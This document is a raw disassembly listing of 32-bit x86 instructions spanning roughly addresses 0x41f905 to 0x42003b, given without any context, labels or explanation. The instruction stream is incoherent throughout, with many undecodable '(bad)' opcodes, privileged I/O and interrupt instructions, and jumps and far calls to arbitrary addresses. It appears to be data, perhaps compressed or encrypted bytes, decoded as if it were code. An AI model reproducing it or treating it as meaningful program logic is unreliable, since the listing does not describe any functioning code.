  41f905:	mov    bl,0xec
  41f907:	je     0x41f909
  41f909:	out    0x42,eax
  41f90b:	popa   
  41f90c:	out    dx,eax
  41f90d:	sar    BYTE PTR [ebx-0x54642ff4],cl
  41f913:	sbb    ah,BYTE PTR [eax-0x44]
  41f916:	cmp    eax,0x44221296
  41f91b:	lahf   
  41f91c:	lods   al,BYTE PTR ds:[esi]
  41f91d:	lock xor esp,DWORD PTR [eax-0x291aee22]
  41f924:	scas   al,BYTE PTR es:[edi]
  41f925:	aam    0xfa
  41f927:	jo     0x41f98f
  41f929:	xchg   ebp,eax
  41f92a:	push   es
  41f92b:	mov    WORD PTR [edi+0x2e],0xdd66
  41f931:	pop    ds
  41f932:	ins    DWORD PTR es:[edi],dx
  41f933:	mov    ch,0xdf
  41f935:	mov    bl,0x69
  41f937:	dec    ebp
  41f938:	adc    DWORD PTR [ebx+eax*8],edi
  41f93b:	sbb    edi,ebx
  41f93d:	sbb    ebx,DWORD PTR [edx]
  41f93f:	mov    dh,0x65
  41f941:	cli    
  41f942:	std    
  41f943:	jae    0x41f91b
  41f945:	jmp    0xbc9c5adb
  41f94a:	jle    0x41f976
  41f94c:	inc    edi
  41f94d:	inc    ecx
  41f94e:	pop    esp
  41f94f:	(bad)  
  41f951:	sub    eax,0xa5f945cc
  41f956:	xchg   esp,eax
  41f957:	dec    esi
  41f958:	std    
  41f959:	and    DWORD PTR [esi],esi
  41f95b:	add    dh,dh
  41f95d:	ins    BYTE PTR es:[edi],dx
  41f95e:	ja     0x41f97d
  41f960:	and    DWORD PTR [edi+0x1ab72027],ecx
  41f966:	xchg   esi,eax
  41f967:	int    0xfd
  41f969:	sti    
  41f96a:	mov    al,0xf4
  41f96c:	and    al,0x6c
  41f96e:	inc    eax
  41f96f:	(bad)  
  41f970:	or     al,0xc6
  41f972:	call   0xe47b988
  41f977:	imul   esi,DWORD PTR [edx],0x67eebda
  41f97d:	cs dec esp
  41f97f:	mov    WORD PTR [ebx],cs
  41f981:	dec    ecx
  41f982:	and    eax,0xf1492cd8
  41f987:	and    al,0x53
  41f989:	pushf  
  41f98a:	mov    DWORD PTR [edi+ebx*1],edx
  41f98d:	xchg   ebx,eax
  41f98e:	jecxz  0x41f974
  41f990:	jae    0x41fa0b
  41f992:	loope  0x41f9d7
  41f994:	mov    WORD PTR [eax+ecx*4-0x6f],fs
  41f998:	mov    ds:0x8096b1b6,eax
  41f99d:	stos   BYTE PTR es:[edi],al
  41f99e:	or     bh,BYTE PTR [eax-0x59b00bb4]
  41f9a4:	(bad)  
  41f9a6:	and    eax,0xec820df2
  41f9ab:	repnz popa 
  41f9ad:	ins    DWORD PTR es:[edi],dx
  41f9ae:	imul   BYTE PTR [edx]
  41f9b0:	sub    dl,ah
  41f9b2:	add    BYTE PTR [ebx],dh
  41f9b4:	sub    DWORD PTR [ebp-0x22eb07db],0x7868e764
  41f9be:	sub    eax,0xf1e7dc46
  41f9c3:	inc    edi
  41f9c4:	sbb    ah,dl
  41f9c6:	sahf   
  41f9c7:	hlt    
  41f9c8:	je     0x41f9c2
  41f9ca:	into   
  41f9cb:	shl    BYTE PTR [ebx+0x7cd84cd4],cl
  41f9d1:	sbb    DWORD PTR [eax-0x43db2b46],ebp
  41f9d7:	mov    dl,0x62
  41f9d9:	inc    esi
  41f9da:	push   edx
  41f9db:	outs   dx,DWORD PTR ds:[esi]
  41f9dc:	test   BYTE PTR [ecx+0x6546d569],dl
  41f9e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9e3:	cmp    eax,0xd4847fc1
  41f9e8:	or     ah,BYTE PTR [eax]
  41f9ea:	pop    ss
  41f9eb:	push   0x5208d5cb
  41f9f0:	mov    ds:0x5d20ac38,al
  41f9f5:	outs   dx,DWORD PTR ds:[esi]
  41f9f6:	sbb    BYTE PTR [ecx-0x59],0xc8
  41f9fa:	push   eax
  41f9fb:	jl     0x41fa66
  41f9fd:	stos   BYTE PTR es:[edi],al
  41f9fe:	or     BYTE PTR [ebp-0x5c258882],bl
  41fa04:	test   eax,0xe6db2e16
  41fa09:	jecxz  0x41fa34
  41fa0b:	xchg   esi,eax
  41fa0c:	stos   DWORD PTR es:[edi],eax
  41fa0d:	dec    edx
  41fa0e:	(bad)  
  41fa0f:	pop    esi
  41fa10:	jp     0x41fa37
  41fa12:	or     BYTE PTR [esi+0x53fdcf23],ch
  41fa18:	push   es
  41fa19:	loop   0x41fa96
  41fa1b:	les    esi,FWORD PTR [ebx-0x66]
  41fa1e:	mov    bh,0xad
  41fa20:	pop    edx
  41fa21:	ds dec esp
  41fa23:	mov    edx,0x1275b4d7
  41fa28:	sub    dl,BYTE PTR [ebp-0x63]
  41fa2b:	mov    ah,0xae
  41fa2d:	icebp  
  41fa2e:	popa   
  41fa2f:	dec    ebx
  41fa30:	pop    edi
  41fa31:	mov    BYTE PTR [eax-0xe],dh
  41fa34:	inc    edx
  41fa35:	ret    0x5c2a
  41fa38:	out    dx,eax
  41fa39:	(bad)  
  41fa3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa3b:	cmp    eax,0x3ce06060
  41fa40:	xchg   eax,esi
  41fa42:	(bad)  
  41fa43:	and    eax,esi
  41fa45:	push   cs
  41fa46:	(bad)  
  41fa47:	icebp  
  41fa48:	mov    cl,0x63
  41fa4a:	imul   ecx,esp,0x26881628
  41fa50:	(bad)  
  41fa51:	pop    edi
  41fa52:	add    cl,BYTE PTR [ecx+0x7407a4ab]
  41fa58:	daa    
  41fa59:	es loope 0x41f9fb
  41fa5c:	retf   
  41fa5d:	and    DWORD PTR [ebx+eax*2],esp
  41fa60:	mov    al,ds:0x22ce81a1
  41fa65:	pop    es
  41fa66:	fs hlt 
  41fa68:	pop    eax
  41fa69:	std    
  41fa6a:	(bad)  
  41fa6b:	adc    BYTE PTR fs:[esi+0x35],dl
  41fa6f:	sbb    BYTE PTR [eax+0x71527a8b],0xde
  41fa76:	adc    DWORD PTR [edx],esi
  41fa78:	outs   dx,DWORD PTR ds:[esi]
  41fa79:	(bad)  
  41fa7a:	mov    esp,0xe985a65d
  41fa7f:	mov    ds:0xf6817628,eax
  41fa84:	clc    
  41fa85:	fidivr WORD PTR ds:0x1804efae
  41fa8b:	jge    0x41fa49
  41fa8d:	jmp    0xda900c08
  41fa92:	test   al,0xf8
  41fa94:	inc    eax
  41fa95:	pop    edx
  41fa96:	into   
  41fa97:	je     0x41fa1e
  41fa99:	sub    BYTE PTR [ebp-0x2d],al
  41fa9c:	mov    esp,0xc655d659
  41faa1:	(bad)  
  41faa2:	mov    ebp,0xe4f28283
  41faa7:	xlat   BYTE PTR ds:[ebx]
  41faa8:	or     ah,BYTE PTR [edx]
  41faaa:	and    dl,BYTE PTR [ebp-0x2b]
  41faad:	jmp    0x41fae2
  41faaf:	jg     0x41fb06
  41fab1:	fcom   QWORD PTR [eax-0x1c]
  41fab4:	push   es
  41fab5:	pop    esp
  41fab6:	mov    ebp,0xbfda79bb
  41fabb:	cld    
  41fabc:	push   eax
  41fabd:	(bad)  
  41fabe:	push   edi
  41fabf:	cvtdq2ps xmm0,xmm4
  41fac2:	out    0xbb,eax
  41fac4:	or     bh,dl
  41fac6:	aas    
  41fac7:	mov    ds:0xa5dee2e2,eax
  41facc:	mov    edi,0x227de107
  41fad1:	scas   eax,DWORD PTR es:[edi]
  41fad2:	mov    ah,0x9d
  41fad4:	xchg   BYTE PTR [esi],ch
  41fad6:	pop    esi
  41fad7:	or     edx,0xbd0024db
  41fadd:	sub    al,0x89
  41fadf:	in     al,0x8a
  41fae1:	jl     0x41fb02
  41fae3:	add    ebx,DWORD PTR [edx+0x44594840]
  41fae9:	adc    esp,DWORD PTR [ecx-0x77a5f47a]
  41faef:	fdivrp st(1),st
  41faf1:	push   es
  41faf2:	xchg   esi,eax
  41faf3:	pop    esp
  41faf4:	scas   eax,DWORD PTR es:[edi]
  41faf5:	comiss xmm7,DWORD PTR [eax-0x15b84dc4]
  41fafc:	jmp    0xdb0e1fbd
  41fb01:	push   edi
  41fb02:	sti    
  41fb03:	loopne 0x41fb58
  41fb05:	xchg   esi,eax
  41fb06:	mov    cl,0xae
  41fb08:	push   cs
  41fb09:	add    eax,0x7b231475
  41fb0e:	xchg   ebx,eax
  41fb0f:	sahf   
  41fb10:	xchg   ecx,eax
  41fb11:	inc    cl
  41fb13:	(bad)  
  41fb15:	fsub   st(6),st
  41fb17:	mov    WORD PTR [ecx-0x56e6a801],gs
  41fb1d:	(bad)  
  41fb1e:	icebp  
  41fb1f:	int    0xb8
  41fb21:	lods   al,BYTE PTR ds:[esi]
  41fb22:	mov    ch,0xd0
  41fb24:	add    DWORD PTR [edi],0x150e8cf4
  41fb2a:	add    edi,DWORD PTR [esi+0x333677cc]
  41fb30:	retf   0x6f31
  41fb33:	test   dl,cl
  41fb35:	xchg   esi,eax
  41fb36:	mov    eax,ds:0xdd68e1a1
  41fb3b:	scas   eax,DWORD PTR es:[edi]
  41fb3c:	in     eax,0x7d
  41fb3e:	mov    dh,0x13
  41fb40:	dec    ebx
  41fb41:	adc    BYTE PTR [esi+0x24679b89],ch
  41fb47:	scas   eax,DWORD PTR es:[edi]
  41fb48:	sahf   
  41fb49:	add    cl,bh
  41fb4b:	push   ecx
  41fb4c:	inc    esp
  41fb4d:	mov    edi,0x9c2197c5
  41fb52:	xchg   esi,eax
  41fb53:	das    
  41fb54:	imul   ebx,DWORD PTR [edi-0x19],0x852ed792
  41fb5b:	and    al,0xb4
  41fb5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb5e:	ret    
  41fb5f:	imul   ecx,DWORD PTR [edi+0x17],0x55d4fd5
  41fb66:	xchg   ecx,eax
  41fb67:	(bad)  
  41fb68:	jae    0x41fb61
  41fb6a:	jmp    0x41fb23
  41fb6c:	gs inc edi
  41fb6e:	xchg   esp,eax
  41fb6f:	int3   
  41fb70:	loope  0x41fbe0
  41fb72:	mov    dh,0x90
  41fb74:	bound  eax,QWORD PTR [esi]
  41fb76:	inc    esi
  41fb77:	jl     0x41fb50
  41fb79:	pop    esi
  41fb7a:	sbb    al,0xb2
  41fb7c:	out    0x97,eax
  41fb7e:	jp     0x41fb12
  41fb80:	cmp    ch,BYTE PTR [edx-0x41]
  41fb83:	out    dx,al
  41fb84:	rol    DWORD PTR [ebp+0x4dfe7908],1
  41fb8a:	loopne 0x41fb4f
  41fb8c:	add    esp,DWORD PTR [ebp-0xa]
  41fb8f:	push   cs
  41fb90:	(bad)  
  41fb91:	push   edx
  41fb92:	test   DWORD PTR [eax+0x605dba67],edx
  41fb98:	add    DWORD PTR [esi-0x650b305d],esi
  41fb9e:	dec    ecx
  41fb9f:	dec    BYTE PTR [ebx+eax*2]
  41fba2:	xchg   BYTE PTR ds:0xdd9f2688,ch
  41fba8:	or     ecx,DWORD PTR [edx]
  41fbaa:	jne    0x41fbed
  41fbac:	jg     0x41fc18
  41fbae:	mov    esp,0xe3e42daa
  41fbb3:	enter  0x4cc3,0x80
  41fbb7:	lds    eax,FWORD PTR [ecx+0x3]
  41fbba:	jo     0x41fc37
  41fbbc:	es and dh,ah
  41fbbf:	shr    DWORD PTR [ecx],cl
  41fbc1:	jne    0x41fc38
  41fbc3:	dec    ebx
  41fbc4:	adc    al,0x4c
  41fbc6:	(bad)  
  41fbc7:	xor    al,0x22
  41fbc9:	lods   al,BYTE PTR ds:[esi]
  41fbca:	adc    ch,ch
  41fbcc:	enter  0x3551,0x4c
  41fbd0:	in     al,dx
  41fbd1:	sti    
  41fbd2:	jae    0x41fc32
  41fbd4:	test   BYTE PTR ds:0x9b4a7039,0x27
  41fbdb:	and    eax,0xf481cce5
  41fbe0:	push   edi
  41fbe1:	ret    0xa393
  41fbe4:	jmp    DWORD PTR [edi+0x41]
  41fbe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbe8:	push   edx
  41fbe9:	imul   edx,ebx,0x2a2c368
  41fbef:	gs test eax,ecx
  41fbf2:	add    eax,0xb4d15d32
  41fbf7:	ret    
  41fbf8:	and    al,0xf5
  41fbfa:	sub    al,0x74
  41fbfc:	add    edx,DWORD PTR [edi+0x769a858e]
  41fc02:	dec    ebx
  41fc03:	stos   DWORD PTR es:[edi],eax
  41fc04:	or     esi,ebx
  41fc06:	jg     0x41fbab
  41fc08:	fcomp  DWORD PTR [eax]
  41fc0a:	ds (bad) 
  41fc0c:	fistp  QWORD PTR [ecx]
  41fc0e:	stos   DWORD PTR es:[edi],eax
  41fc0f:	dec    eax
  41fc10:	cwde   
  41fc11:	xchg   DWORD PTR [ebp+ebp*8-0x7153479a],eax
  41fc18:	mov    bh,0xf9
  41fc1a:	push   edx
  41fc1b:	out    0x4d,al
  41fc1d:	scas   al,BYTE PTR es:[edi]
  41fc1e:	popa   
  41fc1f:	(bad)  
  41fc20:	push   ecx
  41fc21:	ret    0x2d8e
  41fc24:	stc    
  41fc25:	es pop ds
  41fc27:	les    eax,FWORD PTR [ebp-0x4e]
  41fc2a:	jle    0x41fc4c
  41fc2c:	jae    0x41fc0a
  41fc2e:	push   DWORD PTR [edi]
  41fc30:	lahf   
  41fc31:	push   0x2f23d50a
  41fc36:	mov    al,ds:0x42800400
  41fc3b:	popf   
  41fc3c:	dec    edx
  41fc3d:	(bad)  
  41fc3e:	xchg   ebp,eax
  41fc3f:	mov    ebp,0x67d67fc3
  41fc44:	(bad)  
  41fc45:	mov    dh,0xda
  41fc47:	jo     0x41fbe3
  41fc49:	pop    edx
  41fc4a:	test   BYTE PTR [edx-0x33],bh
  41fc4d:	jno    0x41fc97
  41fc4f:	xchg   esp,eax
  41fc50:	mov    esp,0x666f3f8e
  41fc55:	push   0xff65fa1e
  41fc5a:	cmp    esp,DWORD PTR [ecx]
  41fc5c:	mov    bh,0x15
  41fc5e:	stos   BYTE PTR es:[edi],al
  41fc5f:	jno    0x41fccb
  41fc61:	sti    
  41fc62:	ds dec esp
  41fc64:	xor    al,0x5b
  41fc66:	adc    esp,DWORD PTR [edx-0x869a415]
  41fc6c:	mov    edx,DWORD PTR [ecx+0x11152955]
  41fc72:	aas    
  41fc73:	sub    bl,al
  41fc75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc76:	mov    cl,0x68
  41fc78:	mov    ebp,0xe7779d1d
  41fc7d:	xchg   bh,bh
  41fc7f:	ins    DWORD PTR es:[edi],dx
  41fc80:	dec    eax
  41fc81:	cmp    BYTE PTR es:[edx],ah
  41fc84:	ror    DWORD PTR ds:0x485f1a28,cl
  41fc8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc8b:	pop    esi
  41fc8c:	cvttps2pi mm5,QWORD PTR [edx]
  41fc8f:	and    BYTE PTR [edi+ecx*8-0x5bf01bf],dl
  41fc96:	sbb    DWORD PTR [ebx+edi*8+0x1b46b46d],ebx
  41fc9d:	pop    es
  41fc9e:	jae    0x41fc39
  41fca0:	jo     0x41fcb5
  41fca2:	and    ebx,eax
  41fca4:	or     eax,0x821e266
  41fca9:	(bad)  
  41fcaa:	xor    esi,esi
  41fcac:	cdq    
  41fcad:	jl     0x41fc31
  41fcaf:	(bad)  
  41fcb0:	mov    eax,ds:0x6fdbb044
  41fcb5:	jecxz  0x41fc42
  41fcb7:	sbb    al,0xa7
  41fcb9:	test   DWORD PTR [ecx],0x8a5f1c18
  41fcbf:	mov    ds:0x15cdc890,al
  41fcc4:	xchg   ebx,eax
  41fcc5:	mul    BYTE PTR fs:[ebp+0x6c]
  41fcc9:	pop    esp
  41fcca:	xor    cl,ch
  41fccc:	fcomp  DWORD PTR [esi-0x61]
  41fccf:	pusha  
  41fcd0:	ret    0xeee6
  41fcd3:	adc    eax,0xb735850d
  41fcd8:	xchg   DWORD PTR [eax+0x2f],esi
  41fcdb:	jno    0x41fc95
  41fcdd:	jecxz  0x41fcab
  41fcdf:	or     al,0x91
  41fce1:	fsubr  QWORD PTR [edi-0x4a]
  41fce4:	inc    ecx
  41fce5:	imul   esi,DWORD PTR [eax-0x62],0xffffffd5
  41fce9:	push   ecx
  41fcea:	fisub  DWORD PTR [ebp+0x496883e6]
  41fcf0:	pop    ss
  41fcf1:	cmp    edx,0xfb8ee927
  41fcf7:	xor    al,0x62
  41fcf9:	and    BYTE PTR [eax+0xa],0xb8
  41fcfd:	loop   0x41fd71
  41fcff:	mov    ds:0xa45cd31a,al
  41fd04:	add    eax,0x44de82ac
  41fd09:	inc    ebp
  41fd0a:	(bad)  
  41fd0b:	repz jecxz 0x41fd49
  41fd0e:	adc    al,bl
  41fd10:	popf   
  41fd11:	mov    DWORD PTR [ebx+ebx*4-0x21],esi
  41fd15:	lods   al,BYTE PTR ds:[esi]
  41fd16:	mov    ebp,0xb01c7111
  41fd1b:	cli    
  41fd1c:	in     al,0x93
  41fd1e:	rcl    DWORD PTR [edi+0x2f63ab44],cl
  41fd24:	scas   eax,DWORD PTR es:[edi]
  41fd25:	les    eax,FWORD PTR [eax-0x6a]
  41fd28:	shl    edi,cl
  41fd2a:	inc    ebp
  41fd2b:	lods   eax,DWORD PTR ds:[esi]
  41fd2c:	xchg   esp,eax
  41fd2d:	out    dx,eax
  41fd2e:	sbb    DWORD PTR ds:0xc92fb38b,ecx
  41fd34:	es and dl,bh
  41fd37:	fldcw  WORD PTR [eax]
  41fd39:	cli    
  41fd3a:	xchg   BYTE PTR [edi-0x6d],al
  41fd3d:	cmp    eax,DWORD PTR [eax]
  41fd3f:	add    BYTE PTR [eax],al
  41fd41:	add    BYTE PTR [edx-0x48ec49e9],ah
  41fd47:	mov    bl,0xa7
  41fd49:	mov    bh,0xb
  41fd4b:	add    BYTE PTR [edi-0x3f8bf724],dh
  41fd51:	fsub   st(5),st
  41fd53:	ja     0x41fd56
  41fd55:	add    ah,dh
  41fd57:	add    al,0x0
  41fd59:	add    BYTE PTR [eax],bl
  41fd5b:	xor    edi,esi
  41fd5d:	sub    dl,BYTE PTR [eax]
  41fd5f:	dec    edi
  41fd60:	sbb    eax,0xbc8d9197
  41fd65:	aas    
  41fd66:	fidiv  DWORD PTR [edi]
  41fd68:	std    
  41fd69:	and    al,0x88
  41fd6b:	inc    edx
  41fd6c:	leave  
  41fd6d:	sti    
  41fd6e:	not    BYTE PTR [edi+0x4a]
  41fd71:	jbe    0x41fdb9
  41fd73:	test   al,0x67
  41fd75:	in     al,dx
  41fd76:	ror    bl,1
  41fd78:	fcom   DWORD PTR [eax+ebp*2]
  41fd7b:	aad    0xe4
  41fd7d:	mov    eax,ds:0x784fb8d7
  41fd82:	or     DWORD PTR [esi],esi
  41fd84:	adc    ah,BYTE PTR [ebp-0x3]
  41fd87:	or     DWORD PTR [ebp-0x7096b331],ebx
  41fd8d:	mov    dh,0x8a
  41fd8f:	call   0xca2c:0xbc71dfd1
  41fd96:	loope  0x41fdfa
  41fd98:	mov    ah,0xa0
  41fd9a:	xchg   BYTE PTR [esi+0x47e306d],al
  41fda0:	mov    ah,0xcf
  41fda2:	or     bl,cl
  41fda4:	mov    bl,0xcf
  41fda6:	pop    ebp
  41fda7:	mov    bl,0x65
  41fda9:	es xchg ebx,eax
  41fdab:	lods   eax,DWORD PTR ds:[esi]
  41fdac:	sbb    eax,0x5225f884
  41fdb1:	mov    BYTE PTR [esi],bh
  41fdb3:	in     al,dx
  41fdb4:	(bad)  
  41fdb5:	test   BYTE PTR [esi+0x13],0xbd
  41fdb9:	or     ecx,DWORD PTR [ecx]
  41fdbb:	mov    ebx,0xc9d6e1f6
  41fdc0:	imul   ebp,esi,0x24
  41fdc3:	lock add DWORD PTR [ecx+0x6d],0xc6295e2a
  41fdcb:	sub    BYTE PTR [ebx+0x7e],bh
  41fdce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdcf:	cmp    DWORD PTR [ebp-0x1b023121],edi
  41fdd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdd6:	mov    ds:0xce3b804,al
  41fddb:	mov    fs,WORD PTR ds:0xe4786044
  41fde1:	rol    DWORD PTR [ecx+0x3fd93b4b],1
  41fde7:	loope  0x41fe06
  41fde9:	sbb    al,0x9f
  41fdeb:	sub    eax,ebx
  41fded:	arpl   WORD PTR [eax-0x74],sp
  41fdf0:	jo     0x41fdf3
  41fdf2:	scas   eax,DWORD PTR es:[edi]
  41fdf3:	xchg   esp,eax
  41fdf4:	push   es
  41fdf5:	and    edx,DWORD PTR [eax]
  41fdf7:	pop    es
  41fdf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdf9:	(bad)  [edx+ecx*2-0x78906124]
  41fe00:	dec    ebx
  41fe01:	mov    ebp,0x1fd7a3c
  41fe06:	sub    al,ch
  41fe08:	add    edi,edx
  41fe0a:	fsub   DWORD PTR [ecx+ebx*8+0x77]
  41fe0e:	xor    bl,BYTE PTR [ecx-0x37]
  41fe11:	fsubr  DWORD PTR [ebx]
  41fe13:	(bad)  
  41fe14:	adc    eax,0xcf9340f4
  41fe19:	mov    ecx,0x29330e3
  41fe1e:	push   ss
  41fe1f:	mov    ebp,0xe0b3ecc0
  41fe24:	ret    
  41fe25:	dec    DWORD PTR [ebx+0x37]
  41fe28:	add    al,0x48
  41fe2a:	xlat   BYTE PTR ds:[ebx]
  41fe2b:	gs push es
  41fe2d:	push   esp
  41fe2e:	(bad)  
  41fe2f:	pop    ecx
  41fe30:	aaa    
  41fe31:	mov    ch,0x8c
  41fe33:	mov    ebp,0x911b84d8
  41fe38:	call   0x11bab15e
  41fe3d:	int    0x82
  41fe3f:	dec    ebx
  41fe40:	dec    esp
  41fe41:	dec    esi
  41fe42:	push   ebx
  41fe43:	add    eax,0x7a907d9a
  41fe48:	scas   al,BYTE PTR es:[edi]
  41fe49:	pop    es
  41fe4a:	add    dh,BYTE PTR [edi-0x19edb1f1]
  41fe50:	popa   
  41fe51:	and    bh,ah
  41fe53:	pop    edi
  41fe54:	retf   
  41fe55:	pop    edx
  41fe56:	or     bh,BYTE PTR [ebp+0xc]
  41fe59:	xchg   esp,eax
  41fe5a:	out    dx,al
  41fe5b:	and    dl,BYTE PTR [eax-0x76]
  41fe5e:	sub    BYTE PTR [esi],dh
  41fe60:	loopne 0x41fe06
  41fe62:	popf   
  41fe63:	mov    bh,0xa1
  41fe65:	inc    esi
  41fe66:	mov    edx,0xbd649b12
  41fe6b:	pop    es
  41fe6c:	push   esp
  41fe6d:	push   0xffffff9c
  41fe6f:	jmp    0x5b3d:0x3c1f5769
  41fe76:	xor    ebx,ebp
  41fe78:	loopne 0x41fe6d
  41fe7a:	out    0x2a,eax
  41fe7c:	pushf  
  41fe7d:	cmp    DWORD PTR [esi+0x544c6983],esp
  41fe83:	and    cl,BYTE PTR [ecx-0x53fde500]
  41fe89:	add    eax,0xa67bc982
  41fe8e:	retf   
  41fe8f:	ret    0x699b
  41fe92:	test   al,0x82
  41fe94:	rcl    DWORD PTR [eax+0x19],1
  41fe97:	or     eax,0x57704822
  41fe9c:	adc    cl,BYTE PTR [ebp+ebx*1-0x2fd1bf2f]
  41fea3:	xchg   DWORD PTR [ecx+ebp*1-0x1cf765a1],edi
  41feaa:	xchg   esp,eax
  41feab:	mov    bh,0x5b
  41fead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feae:	test   DWORD PTR [edx],ebp
  41feb0:	cmp    al,0xad
  41feb2:	in     al,0x9e
  41feb4:	cmp    ah,dl
  41feb6:	and    DWORD PTR [esi],edi
  41feb8:	xchg   ecx,eax
  41feb9:	push   es
  41feba:	jno    0x41feb4
  41febc:	push   ds
  41febd:	stc    
  41febe:	jne    0x41fe81
  41fec0:	into   
  41fec1:	inc    eax
  41fec2:	mov    ebx,0xcf32fa7d
  41fec7:	out    0xa7,al
  41fec9:	cmp    BYTE PTR ds:0xf2c0533a,bh
  41fecf:	pop    ecx
  41fed0:	mov    bl,0x3c
  41fed2:	hlt    
  41fed3:	and    eax,0xc549b405
  41fed8:	add    dh,BYTE PTR ds:0x8b61b9ee
  41fede:	mov    eax,ds:0x21a6e741
  41fee3:	add    eax,DWORD PTR [ecx]
  41fee5:	scas   al,BYTE PTR es:[edi]
  41fee6:	scas   al,BYTE PTR es:[edi]
  41fee7:	push   0xffffff9c
  41fee9:	push   edx
  41feea:	push   ds
  41feeb:	int    0xa3
  41feed:	sti    
  41feee:	mov    dh,0x49
  41fef0:	icebp  
  41fef1:	(bad)  
  41fef2:	(bad)  
  41fef3:	aam    0x48
  41fef5:	out    0x11,eax
  41fef7:	add    al,0x4c
  41fef9:	inc    edi
  41fefa:	shr    DWORD PTR [ebp-0x31],1
  41fefd:	ud1    esp,DWORD PTR [edx-0x27]
  41ff01:	and    ch,BYTE PTR [ecx+eiz*4+0x50]
  41ff05:	or     BYTE PTR [ecx+edi*2-0x23],ch
  41ff09:	add    BYTE PTR [ebx-0x496065c2],al
  41ff0f:	pop    edx
  41ff10:	popa   
  41ff11:	call   FWORD PTR [ecx+ebx*8]
  41ff14:	fisubr DWORD PTR [edi+0xf]
  41ff17:	sub    DWORD PTR [edi-0x30],edx
  41ff1a:	jg     0x41ff22
  41ff1c:	inc    ebx
  41ff1d:	fmul   QWORD PTR [eax-0x4c]
  41ff20:	add    DWORD PTR [ecx+0x58dcdf06],0xffffff8d
  41ff27:	aam    0x24
  41ff29:	div    DWORD PTR [ecx-0x568d558]
  41ff2f:	fstp   DWORD PTR [edx]
  41ff31:	push   eax
  41ff32:	dec    ecx
  41ff33:	std    
  41ff34:	adc    DWORD PTR [edi+ebp*8],ecx
  41ff37:	mov    al,ds:0xd80b43c6
  41ff3c:	push   esi
  41ff3d:	adc    ch,BYTE PTR [ebx]
  41ff3f:	lods   eax,DWORD PTR ds:[esi]
  41ff40:	add    esp,ecx
  41ff42:	retf   
  41ff43:	dec    esp
  41ff44:	loope  0x41ff30
  41ff46:	shr    ebp,1
  41ff48:	pmaxub mm5,mm3
  41ff4b:	hlt    
  41ff4c:	xchg   edi,eax
  41ff4d:	popf   
  41ff4e:	fs adc bl,cl
  41ff51:	out    dx,al
  41ff52:	dec    eax
  41ff53:	call   0x711f:0x8c4f0a5d
  41ff5a:	ret    
  41ff5b:	cld    
  41ff5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff5d:	(bad)  
  41ff5e:	test   BYTE PTR [ebp+0x64],0xe
  41ff62:	and    al,0x97
  41ff64:	xchg   edx,eax
  41ff65:	lahf   
  41ff66:	out    0xfc,eax
  41ff68:	daa    
  41ff69:	loopne 0x41ffac
  41ff6b:	and    edx,DWORD PTR [eax-0x50]
  41ff6e:	mov    esi,0x9acd938a
  41ff73:	sub    eax,0xb608338d
  41ff78:	rcr    ecx,cl
  41ff7a:	jb     0x41ffca
  41ff7c:	icebp  
  41ff7d:	mov    ah,0x7d
  41ff7f:	pop    cx
  41ff81:	xor    al,BYTE PTR fs:[ebx-0x31]
  41ff85:	test   eax,0xd44bc746
  41ff8a:	xor    al,0xd5
  41ff8c:	test   al,0x61
  41ff8e:	retf   
  41ff8f:	jmp    0xc90de3ce
  41ff94:	jle    0x41ffdf
  41ff96:	in     al,dx
  41ff97:	call   0x9291:0x95a2ce9f
  41ff9e:	sub    DWORD PTR [eax+0x3a],eax
  41ffa1:	sub    al,0x2e
  41ffa3:	mov    dh,BYTE PTR [edi]
  41ffa5:	push   ds
  41ffa6:	xor    DWORD PTR [edi-0x9],ecx
  41ffa9:	inc    ecx
  41ffaa:	sar    DWORD PTR [edi-0x79ab01df],cl
  41ffb0:	pop    esp
  41ffb1:	xchg   edi,eax
  41ffb2:	mov    cl,BYTE PTR [eax-0xab9f0d5]
  41ffb8:	imul   esp,edx,0x9d2eff29
  41ffbe:	es test al,0xe3
  41ffc1:	adc    eax,0xed5cb067
  41ffc6:	mov    cl,0xb0
  41ffc8:	mov    ds:0xa1e44b96,al
  41ffcd:	dec    edi
  41ffce:	fsubr  QWORD PTR [ecx+0x713ace38]
  41ffd4:	js     0x41ff7b
  41ffd6:	inc    BYTE PTR [eax+0x461c62f6]
  41ffdc:	in     al,0x1d
  41ffde:	or     ebp,esi
  41ffe0:	ins    BYTE PTR es:[edi],dx
  41ffe1:	sbb    dl,dh
  41ffe3:	mov    BYTE PTR [edi-0x24],al
  41ffe6:	repz fwait
  41ffe8:	daa    
  41ffe9:	sbb    BYTE PTR [ebx],dl
  41ffeb:	gs call 0x6c26c015
  41fff1:	inc    eax
  41fff2:	adc    BYTE PTR [edx-0x7a4f381d],0xc7
  41fff9:	or     ah,BYTE PTR es:[edi]
  41fffc:	aaa    
  41fffd:	nop
  41fffe:	pop    ecx
  41ffff:	pop    ecx
  420000:	pop    ds
  420001:	jmp    FWORD PTR [edi-0x1a]
  420004:	add    eax,0x40dab0b1
  420009:	les    edi,FWORD PTR [ecx+edi*4]
  42000c:	cmp    eax,esp
  42000e:	dec    esp
  42000f:	adc    bl,BYTE PTR [ebx-0x7e]
  420012:	ins    DWORD PTR es:[edi],dx
  420013:	push   edi
  420014:	mov    ebp,0x2ea03273
  420019:	push   0xffffffbe
  42001b:	repz call 0x437275ca
  420021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420022:	fsubr  DWORD PTR [edx]
  420024:	inc    ebx
  420025:	mov    ebx,0xf34dd032
  42002a:	and    ah,BYTE PTR [edx-0xb8a00a4]
  420030:	dec    edx
  420031:	lods   al,BYTE PTR ds:[esi]
  420032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420033:	add    DWORD PTR [ebp+0x7b],esp
  420036:	mov    al,0xf8
  420038:	scas   al,BYTE PTR es:[edi]
  420039:	pop    eax
  42003a:	pushf  
  42003b:	jle    0x42007d
